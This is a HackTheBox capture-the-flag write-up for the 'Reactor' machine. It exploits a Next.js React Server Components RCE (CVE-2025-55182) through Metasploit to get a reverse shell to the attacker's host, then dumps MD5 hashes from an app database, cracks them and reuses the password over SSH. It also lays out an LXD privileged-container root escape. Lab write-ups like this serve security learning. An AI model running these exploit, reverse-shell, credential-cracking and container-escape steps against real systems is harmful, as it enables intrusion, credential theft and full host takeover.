# HackTheBox — Reactor

**Target:** 10.129.245.214   **DNS:** reactor.htb   **OS:** Linux (Ubuntu 24.04, kernel 6.8)   **Difficulty:** Easy   **Date:** 2026-07-04
**Status:** USER OWNED — root PENDING (LXD-group escape identified, not yet executed)
**User flag:** `b8b6d1931935b7e37f91ded1e39617c1`   **Root flag:** _TBD_

---

## Executive Summary

Reactor is a single-web-app box whose foothold is an **unauthenticated React Server Components RCE in Next.js**, not the middleware-bypass CVE the theme baits you toward.

1. Port 3000 runs **Next.js 15.0.3 (App Router, React 19)** — a static "ReactorWatch" nuclear-monitoring **decoy** dashboard at `/`. No other pages, vhosts, or APIs exist.
2. The box dangles **CVE-2025-29927** (Next.js `x-middleware-subrequest` middleware auth-bypass) as a **red herring** — the version is technically vulnerable, but there is **no middleware / protected route** to bypass, so it goes nowhere.
3. The real foothold is **CVE-2025-55182 "React2Shell"** — an **unauthenticated RCE via insecure deserialization in the RSC "Flight" protocol** (App Router server actions). Metasploit → reverse shell as **`node`** (uid 999).
4. The app's SQLite **`reactor.db`** holds **MD5** password hashes; cracking `engineer`'s hash gives `reactor1`, which is **reused for the system user `engineer`** over SSH → **user flag**.
5. **Root (pending):** `engineer` is in the **`lxd` group** → privileged-container escape to root.

**Credential / loot trail:**

| Item | Source | Used for |
|---|---|---|
| Next.js **15.0.3** (exact version) | grep of downloaded client JS chunks | CVE selection (matched CVE-2025-55182) |
| RCE as `node` | CVE-2025-55182 (React2Shell) | read app files |
| `engineer : 39d9…1e8e` (MD5) | `reactor.db` `users` table | cracked → `reactor1` |
| `engineer : reactor1` | password reuse | `ssh engineer@reactor.htb` (user) |
| `admin : a203…17b8` (MD5) | `reactor.db` | not cracked (rockyou) — unneeded |
| `engineer ∈ lxd` group | `id` | root via LXD container escape (pending) |

---

## 1. Recon

### 1.1 Nmap

```
sudo nmap -Pn -sS -sV -sC -A 10.129.245.214 -oN reactorScan.txt -v
sudo nmap -Pn -p- --min-rate 5000 -T4 10.129.245.214 -oN reactorAllPorts.txt
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 |
| 3000 | HTTP | **Next.js** (nmap labels it `ppp` on a bare SYN scan — ignore; `-sV` shows `X-Powered-By: Next.js`) |

- Full `-p-` confirms **only 22 + 3000**. SSH = pivot; port 3000 = the entire attack surface.
- `reactor.htb` already resolved (HTB DNS / hosts).

**Gotcha — the "ppp" label:** port 3000 is registered as `ppp` in `nmap-services`, so a non-version scan prints that. The `-sV` scan is ground truth: it's an HTTP/Next.js server.

### 1.2 App fingerprint

`http://reactor.htb:3000/` → **"ReactorWatch — Core Monitoring System v3.2.1"**, a **statically prerendered** (`x-nextjs-cache: HIT`, `x-nextjs-prerender: 1`) App Router page (RSC — `self.__next_f`, `main-app-*` chunk). Pure **decoy**: no forms, no client fetch/XHR, no interactivity. Harvested staff names (username candidates): **Elena Rodriguez, Marcus Kim, James Thompson**.

### 1.3 Enumeration that found NOTHING (documented so we don't repeat it)

- **vhosts** — `ffuf … -H "Host: FUZZ.reactor.htb" -w dnsmap.txt -fs 17175` → none.
- **directories** — `ffuf …/FUZZ -w directory-list-2.3-medium.txt -fc 404` → only wordlist-comment noise; every clean path 404s.
- **source maps** — `*.js.map` all 404 (genuine Next 404 baseline ≈ 6772 bytes).
- **client bundle** — chunks `517`/`main-app` are pure Next.js framework runtime; `password`/`Token` strings live only in the React vendor + polyfill chunks (framework noise). No app routes/endpoints leaked.
- **404 body size** scales linearly with path length → the 404 reflects the requested path (URL-encoded in the RSC flight data), so guessed routes are *genuinely* absent, **and there is no XSS sink** (`< " >` come back as `%3C %22 %3E`).
- **`/_next/image` SSRF** — `?url=http://127.0.0.1:22…` → all **400** (optimizer rejects remote/abs URLs). Not exploitable.
- **nikto** — only header-hygiene notes + Drupal/eZ **false positives** (soft-404 matching). The trailing-slash `Refresh`/308 is just default Next.js `trailingSlash` normalization, not middleware.

### 1.4 CVE-2025-29927 — the red herring

The theme (Next.js + "Reactor") baits the **`x-middleware-subrequest` middleware bypass**. We tested it thoroughly:

```
# no protected route ever flipped 404 -> 200 with any header value:
curl -s -H "x-middleware-subrequest: middleware" http://reactor.htb:3000/<route>
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" …
curl -s -H "x-middleware-subrequest: src/middleware:src/middleware:…" …
```

**Verdict:** the version *is* in range (< 15.2.3), but the app has **no middleware and no protected route**, so the bypass has nothing to open. Dead end — the box uses it purely as a distraction.

### 1.5 Breakthrough — pin the EXACT version, then match ALL its CVEs

Downloaded the client chunks and grepped for a version string:

```
mkdir -p /tmp/reactor && cd /tmp/reactor
for c in webpack-* 4bd1b696-* 517-* main-app-* polyfills-*; do curl -s "http://reactor.htb:3000/_next/static/chunks/$c.js" -o "$c.js"; done
grep -rhoiE '"version":"[0-9.]+"|1[0-9]\.[0-9]+\.[0-9]+' /tmp/reactor/*.js | sort -u
# -> 15.0.3   (Next.js)
# -> 19.0.0   (React)
```

`package.json` (post-shell) confirmed `next 15.0.3 / react 19.0.0`.

Metasploit search on the framework — **not just the themed CVE**:

```
msfconsole -q -x "search nextjs; exit"
# exploit/multi/http/react2shell_unauth_rce_cve_2025_55182  (2025-12-03, excellent, Check=Yes)
#   Unauthenticated RCE in React Server Components (React2Shell)
```

**CVE-2025-55182 (React2Shell)** — unauth RCE via insecure deserialization in the **RSC "Flight" protocol** (App Router server actions). Next.js 15.x App Router = exact match. **Needs no hidden route** — it hits the live RSC endpoint on `/`. This is why route-hunting was futile.

---

## 2. Foothold — CVE-2025-55182 (React2Shell) → shell as `node`

```
msfconsole -q
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS 10.129.245.214
set RPORT 3000
set VHOST reactor.htb
set TARGETURI /
set TARGET 0                     # Next.js - Unix Command
set LHOST 10.10.16.141           # tun0
set LPORT 4444
check                            # -> [+] The target appears to be vulnerable.
```

**Payload auto-selected:** `cmd/unix/reverse_nodejs` (fitting — Next.js runs on Node).

**Gotcha:** the pre-exploit **auto-check aborts** (`target / is not vulnerable`) because `/` is a **cached prerender** and the conservative probe doesn't see the dynamic action handler. The standalone `check` already confirmed vulnerable, so override it (a POST server-action bypasses the prerender cache):

```
set ForceExploit true
exploit
# [*] Command shell session 1 opened … as node@reactor
```

Landed in **`/opt/reactor-app`** as **`node`** (uid 999):

```
id            # uid=999(node) gid=988(node)
hostname      # reactor
uname -a      # Linux reactor 6.8.0-117-generic … Ubuntu x86_64
ls -la        # app/ .env .next/ next.config.js package.json reactor.db …
```

---

## 3. Post-Exploitation → User (`engineer`)

### 3.1 App database → MD5 hashes

```
cat .env
# DB_PATH=/opt/reactor-app/reactor.db  (sqlite3)
# SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
# ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook   <-- internal host, noted for later
# (no login passwords in .env)

sqlite3 reactor.db 'select username,password_hash,email,role from users;'
# admin    |a203b22191d744a4e70ada5c101b17b8|admin@reactor.htb   |administrator
# engineer |39d97110eafe2a9a68639812cd271e8e|engineer@reactor.htb|operator
```

32-hex = **MD5**.

### 3.2 Crack → password reuse → SSH

On the attacker box:

```
printf '39d97110eafe2a9a68639812cd271e8e\na203b22191d744a4e70ada5c101b17b8\n' > reactor.md5
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt reactor.md5
john --format=raw-md5 --show reactor.md5
# -> reactor1   (engineer's hash; admin's did not crack with rockyou — not needed)
```

System users (`/etc/passwd`): only **`engineer`** (uid 1000, `/home/engineer`, bash) has a login shell → the flag owner. Password reuse:

```
ssh engineer@reactor.htb        # password: reactor1
id                              # uid=1000(engineer) groups=…,101(lxd)
cat ~/user.txt
# b8b6d1931935b7e37f91ded1e39617c1
```

**USER FLAG: `b8b6d1931935b7e37f91ded1e39617c1`** ✅

---

## 4. Privilege Escalation → Root (PENDING — vector identified)

### 4.1 Enumeration

```
sudo -l                         # engineer may NOT run sudo
find / -perm -4000 -type f 2>/dev/null   # all STOCK (chfn/umount/gpasswd/passwd/chsh/sudo/su/mount/newgrp/…)
getcap -r / 2>/dev/null         # stock (ping/mtr net_raw, snap-confine, gst-ptp-helper) — nothing exploitable
id
# groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
```

### 4.2 The vector — `lxd` group

**`engineer` is in the `lxd` group** → classic **LXD privileged-container escape**: create a container with `security.privileged=true` and a disk device mapping the host `/`, then as root inside the container read `/root/root.txt` (or `chmod +s /bin/bash` on the host).

**Caveat found:** on Ubuntu 24.04 `/usr/sbin/lxc` + `/usr/sbin/lxd` are the **`lxd-installer` shim** — running `lxc --version` printed `Installing LXD snap, please be patient` (installs on first use, needs network). **Before executing the escape, confirm LXD is actually installed & the daemon socket exists:**

```
snap list                       # is 'lxd' present?
ps aux | grep '[l]xd'
ls -la /var/snap/lxd/common/lxd/unix.socket /var/lib/lxd/unix.socket 2>/dev/null
lxc list                        # a table (even empty) = LXD is live
```

### 4.3 Planned exploitation (next session)

- **If LXD is live and an image exists:** `lxc image list` → launch privileged container mounting host root:
  ```
  lxc init <image> r00t -c security.privileged=true
  lxc config device add r00t host disk source=/ path=/mnt/root recursive=true
  lxc start r00t && lxc exec r00t /bin/sh
  # inside: cat /mnt/root/root/root.txt  OR  chmod +s /mnt/root/bin/bash
  ```
- **If no image / no store connectivity:** build a tiny Alpine LXD image on the attacker (`lxd-alpine-builder` / distrobuilder), transfer over HTTP, `lxc image import alpine.tar.gz --alias alpine`, `lxd init --auto`, then as above.
- **If the lxd snap genuinely isn't installed and can't reach the store:** sideload the `lxd` snap from the attacker (`snap install --dangerous lxd_*.snap`) or re-check for an alternate root path.

---

## 5. What Worked / What Didn't

**Worked**
- **Pinning the exact framework version from client JS chunks** (`grep '1x.y.z'`) — `15.0.3` was the key that unlocked the right CVE. Version-matching should have been step one, not step ten.
- **Enumerating ALL CVEs for the version, not just the themed one.** `search nextjs` in msf surfaced React2Shell (CVE-2025-55182); the box's whole design steered us at CVE-2025-29927 instead.
- **`ForceExploit true`** — the exploit's auto-check is over-conservative against a cached prerender; the standalone `check` was the reliable signal.
- **App DB → MD5 → password reuse → SSH** — the standard "web-app creds reused for the system user" chain (same as Enigma/Nexus).

**Didn't work / dead ends (time sinks to avoid next time)**
- **CVE-2025-29927 middleware bypass** — version-vulnerable but **no middleware/route** existed. A deliberate distraction.
- **Route/vhost/dir fuzzing, source maps, `/_next/image` SSRF, XSS, nikto** — all empty; the app is a pure decoy and the vuln was never route-based.

## 6. Lessons Learned / Reusable Techniques

- **Get the EXACT version before choosing an exploit.** For Next.js, grep the downloaded client chunks: `grep -rhoiE '"version":"[0-9.]+"|1[0-9]\.[0-9]+\.[0-9]+' *.js`. Confirm with `package.json` after shell.
- **A vulnerable version ≠ the intended vuln.** Enumerate *every* CVE in range (`msfconsole -q -x "search <framework>"`) and prefer the one that fits the observed surface. A static App-Router page with no routes points at an **RSC-protocol** bug (CVE-2025-55182), not a route/middleware bug (CVE-2025-29927).
- **CVE-2025-55182 (React2Shell):** unauth RCE via RSC "Flight" deserialization on **any Next.js 15.x App Router** app. MSF `exploit/multi/http/react2shell_unauth_rce_cve_2025_55182`, `TARGET 0` (Unix), payload `cmd/unix/reverse_nodejs`, `TARGETURI /`. If the auto-check balks on a cached page, `set ForceExploit true`.
- **Always crack + spray app-DB creds against SSH** for the human user (`john --format=raw-md5`). One MD5 → `reactor1` → `ssh engineer`.
- **Check group membership for privesc** (`id`): `lxd`, `docker`, `disk`, `adm` are instant leads. `lxd` → privileged-container host-root mount.
- **Ubuntu 24.04 LXD caveat:** `lxc`/`lxd` in `/usr/sbin` are install-on-demand shims (`lxd-installer`); verify the snap is installed and `unix.socket` exists before relying on the escape.

Cross-references: `methodology/core-principles.md` (get exact version; simple before complex; don't tunnel on the first CVE), `Machines/htb-enigma.md` + `Machines/htb-nexus.md` (app-DB → cred-reuse → SSH pattern).
